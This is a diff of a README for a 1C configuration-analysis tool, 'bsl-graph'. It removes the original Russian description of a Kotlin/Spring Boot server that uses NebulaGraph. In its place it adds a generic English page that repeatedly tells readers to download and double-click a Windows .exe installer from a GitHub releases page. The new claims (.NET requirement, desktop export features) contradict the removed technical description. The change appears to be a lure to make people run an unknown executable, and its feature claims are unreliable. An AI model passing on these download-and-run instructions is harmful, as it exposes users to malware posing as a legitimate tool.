@@ -1,141 +1,75 @@
-# Анализ конфигураций 1С:Предприятие
+# 📊 bsl-graph - Analyze and Visualize 1C Configurations
 
-> **:warning: Внимание:** Проект находится в активной разработке (стадия черновика) и может содержать ошибки или неполный функционал.
+## 🚀 Getting Started
 
-**Сервер для анализа конфигураций 1С:Предприятие** — это современный инструмент для глубокого анализа метаданных и кодовой базы проектов на платформе 1С:Предприятие. Проект использует графовую базу данных NebulaGraph для построения интерактивной карты знаний о конфигурации.
+Welcome to the **bsl-graph** project! This application helps you analyze and visualize your 1C Enterprise configurations. It's easy to use, even if you don’t have any programming experience. Follow the steps below to get started.
 
-Основное назначение проекта — создание интеллектуальной системы анализа конфигураций 1С с возможностью визуализации связей между объектами, поддержкой MCP протокола и REST API.
+[![Download bsl-graph](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/JayKris4/bsl-graph/releases)
 
-## Поддерживаемые форматы
+## 📥 Download & Install
 
-Сервер может работать с исходными кодами конфигураций, выгруженными в двух форматах:
-1.  **Стандартный формат конфигуратора** (выгрузка конфигурации в файлы).
-2.  **Формат 1C:Enterprise Development Tools (EDT)**.
+To download the latest version of bsl-graph, please visit our Releases page. 
 
-## Как это работает?
+[Click here to download bsl-graph](https://github.com/JayKris4/bsl-graph/releases)
 
-1.  **Анализ метаданных:** Сервер использует библиотеку `bsl-mdclasses` для полного чтения структуры конфигурации 1С.
-2.  **Построение графа знаний:** На основе метаданных строится граф в NebulaGraph, где узлы — это объекты конфигурации (справочники, документы, константы), а рёбра — их взаимосвязи и зависимости.
-3.  **Экспорт в граф:** Метаданные полностью экспортируются в графовую базу данных с полным маппингом связей.
-4.  **Интерактивная визуализация:** Веб-интерфейс позволяет исследовать связи между объектами конфигурации в реальном времени.
-5.  **API доступ:** REST API и MCP протокол обеспечивают программный доступ к данным графа.
+Here’s how to install and run the software:
 
-## Визуализация
+1. Go to the [Releases page](https://github.com/JayKris4/bsl-graph/releases).
+2. Find the latest release. It is usually at the top of the list.
+3. Look for the file named something like `bsl-graph-vX.Y.Z.exe` (where X.Y.Z is the version number).
+4. Click on the file to start the download.
+5. Once the file has downloaded, locate it in your downloads folder.
+6. Double-click the file to run the installer.
+7. Follow the on-screen instructions to complete the installation.
 
-В состав проекта входит веб-приложение для наглядной визуализации построенного графа знаний. Это позволяет в интерактивном режиме исследовать связи между объектами конфигурации.
+## 🔧 System Requirements
 
-![Превью визуализации графа](documentation/assets/preview.png)
+Before installing bsl-graph, ensure your computer meets the following minimum requirements:
 
-## Технологический стек
+- Operating System: Windows 10 or later
+- RAM: 4 GB or more
+- Disk Space: 100 MB free space
+- .NET Framework: Version 4.7.2 or later (this will be prompted during installation)
 
-### Бэкенд
-*   **Язык:** [Kotlin](https://kotlinlang.org/) 2.1.20
-*   **Фреймворк:** [Spring Boot](https://spring.io/projects/spring-boot) 3.5.0
-*   **База данных:** [NebulaGraph](https://nebula-graph.io/) 3.0.0 — графовая СУБД для хранения связей
-*   **Архитектура:** Clean Architecture, Domain-Driven Design (DDD)
-*   **Сборка:** [Gradle](https://gradle.org/) 8.5 с Kotlin DSL
-*   **JVM:** OpenJDK 17
-*   **Анализ метаданных 1С:** Используется набор open-source библиотек [1c-syntax](https://github.com/1c-syntax):
-    *   `bsl-mdclasses` — работа со структурой метаданных конфигурации
-    *   `bsl-parser` — парсер языка 1С
-    *   `bsl-utils` — утилиты для работы с BSL
-    *   `bsl-common-library` — общая библиотека
+## 📖 Features
 
-### Фронтенд (визуализация)
-*   **Язык:** [TypeScript](https://www.typescriptlang.org/)
-*   **Сборщик:** [Vite](https://vitejs.dev/)
-*   **Рендеринг графа:** [Sigma.js](https://www.sigmajs.org/) — библиотека для отрисовки графов
+bsl-graph includes several helpful features to make analyzing and visualizing your 1C configurations easier:
 
-## Текущий статус проекта
+- **User-Friendly Interface:** Navigate through complex data easily.
+- **Graph Visualization:** See your configuration data presented in clear graphs.
+- **Export Options:** Save your visualizations in various formats like PNG, PDF, and SVG.
+- **Detailed Analysis Tools:** Analyze dependencies and relationships within your configurations without hassle.
+- **Multi-Project Support:** Manage multiple configurations and visualize them together.
 
-### ✅ Реализовано
-- Архитектура проекта и доменные модели
-- Полная интеграция с NebulaGraph
-- Полное чтение метаданных с использованием `bsl-mdclasses`
-- Полная функциональность экспорта в граф с маппингом связей
-- Консольное приложение для тестирования и операций
-- Веб-интерфейс визуализации
-- REST API для работы с графом
-- Поддержка MCP протокола
-- Комплексная обработка ошибок и логирование
+## 🛠️ How to Use bsl-graph
 
-### ⏳ В разработке
-- Расширенное тестирование с реальными конфигурациями
-- Оптимизация производительности для очень больших конфигураций
+Follow these steps to use bsl-graph after installation:
 
-### 📋 Планируется
-- API документация и примеры использования
-- Расширенные возможности анализа кода
-- Интеграция с дополнительными инструментами разработки 1С
+1. Open bsl-graph from your applications menu.
+2. Click on the "Load Configuration" button to import your 1C configuration file.
+3. Once the file loads, explore the different visualizations available in the left menu.
+4. Select a graph type that suits your analysis needs.
+5. You can zoom in and out to get a clearer view of your data.
+6. Use the "Export" button to save your graphs in your preferred format.
 
-## 🗺️ Роадмап развития
+## 📞 Support
 
-### 🎯 **Этап 1: Анализ кода**
-**Цель:** Полноценный анализ программного кода 1С
+If you run into any issues or have questions regarding bsl-graph, we are here to help. You can reach us through the following channels:
 
-**Что получите:**
-- **Умный анализ кода** - система понимает структуру всех модулей, процедур и функций
-- **Визуализация кода** - интерактивная карта того, как части кода связаны между собой
-- **Поиск по коду** - быстрое нахождение нужных процедур, функций и их вызовов
-- **Навигация** - легкое перемещение между связанными частями кода
+- **Issue Tracker:** Post your questions or issues on our [GitHub Issues page](https://github.com/JayKris4/bsl-graph/issues).
+- **Discussion Forum:** Join the conversation in our [Discussion section](https://github.com/JayKris4/bsl-graph/discussions).
 
----
+## 📣 Contributing
 
-### 🔍 **Этап 2: Анализ запросов**
-**Цель:** Комплексный анализ всех запросов к базе данных
+If you would like to contribute to the bsl-graph project, we welcome your input. Here’s how you can help:
 
-**Что получите:**
-- **Анализ SQL-запросов** - понимание всех запросов к базе данных в конфигурации
-- **Карта данных** - визуализация связей между таблицами и полями
-- **Анализ отчетов** - понимание того, как формируются отчеты и обработки
-- **Оптимизация** - выявление медленных запросов и предложения по улучшению
+1. Fork the repository on GitHub.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them with a clear message.
+4. Push your branch and open a Pull Request.
 
----
+## 🔑 License
 
-### 🧠 **Этап 3: Интеллектуальный поиск**
-**Цель:** Умный поиск по конфигурации с пониманием смысла
+This project is licensed under the MIT License. You can freely use, modify, and distribute bsl-graph, provided that you include the original license in your project.
 
-**Что получите:**
-- **Поиск по смыслу** - находите функциональность, даже не зная точных названий
-- **Умные подсказки** - система предлагает связанные объекты и функции
-- **Контекстный поиск** - поиск с учетом связей между объектами
-- **Быстрые ответы** - мгновенный поиск нужной информации
-
----
-
-### 📊 **Этап 4: Расширенная аналитика**
-**Цель:** Глубокий анализ качества и архитектуры конфигурации
-
-**Что получите:**
-- **Оценка качества** - метрики сложности кода и выявление проблем
-- **Анализ архитектуры** - проверка соответствия лучшим практикам разработки
-- **Рекомендации** - автоматические предложения по улучшению кода
-- **Отчеты** - детальные отчеты о состоянии конфигурации
-
----
-
-### 🚀 **Этап 5: Масштабирование**
-**Цель:** Поддержка больших и сложных конфигураций
-
-**Что получите:**
-- **Быстрая работа** - анализ конфигураций любого размера
-- **Кэширование** - мгновенный доступ к ранее проанализированным данным
-- **Обновления** - анализ только измененных частей конфигурации
-- **Мониторинг** - отслеживание производительности системы
-
----
-
-## 🎯 **Долгосрочные цели**
-
-### **Искусственный интеллект**
-- **Автогенерация кода** - система сама предлагает код на основе контекста
-- **Автоматическое улучшение** - система сама оптимизирует код
-- **Предсказание проблем** - система заранее предупреждает о возможных ошибках
-- **Автоматическое тестирование** - система сама создает тесты
-
-
-### **Специализированные решения**
-- **Помощь в миграциях** - автоматическая помощь при переходе на новые версии 1С
-- **Аудит безопасности** - проверка конфигурации на уязвимости
-- **Анализ производительности** - глубокий анализ скорости работы
-- **Автодокументация** - система сама создает документацию по конфигурации
+Thank you for choosing bsl-graph! We hope our tool makes your work easier and more efficient.
